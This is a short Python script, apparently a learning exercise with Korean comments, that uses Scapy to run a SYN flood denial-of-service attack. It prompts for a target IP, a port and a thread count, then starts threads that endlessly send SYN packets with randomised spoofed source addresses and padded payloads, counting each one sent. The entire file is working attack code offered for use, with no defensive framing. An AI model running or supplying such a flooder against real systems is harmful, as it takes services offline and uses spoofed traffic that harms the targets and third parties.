from scapy.all import *
import string
import threading

class synflood(threading.Thread):
    #클래스 생성시 thread로 상속받으면 이후 클래스명으로 스래드 객체 생성가능! 
    def __init__(self, ip, port):
        threading.Thread.__init__(self) # thread init
        self.ip = ip 
        self.port = port
        self.count = 0 # count 
        self.data = (string.ascii_letters + string.digits) * 10 #문자열 변수 
    
    def run(self):    
        while True:
            self.flooding = IP(src=RandIP(), dst = self.ip, len = 65535) / TCP(flags='S', sport=RandShort(), dport=self.port,window = 1450)/Raw(load=self.data)
            #요청시 무작위 IP생성 해서 보내줌, dst = 상대방 ip, len = IP패킷의 전체길이
            #flags = S(SYN) A(ACK) ...
            # sport = 출발지 포트
            # dport = 상대편의 포트
            # window = TCP의 WindowSize

            # Raw 데이터, 위에서 생성한 문자열을 SYN Flooding을 시도할때 껴넣는다.
            send(self.flooding)
            
            print("전송된 패킷 수:" + str(self.count))
            self.count += 1
    



def main():
    ip = input("대상 ip를 입력해 주세요 : ")
    port = int(input("대상 포트를 입력해 주세요 : "))
    threadNum = int(input('스레드 개수를 입력해 주세요(주의: 크면 많이 보내지만... 숫자가 너무크면 자원을 너무먹음) : '))

    threadList = []

    for i in range(threadNum):
        i = synflood(ip,port)
        threadList.append(i)
        i.start()

if __name__ == '__main__': #현재 스크립트파일이 메인으로 실행되면
    main()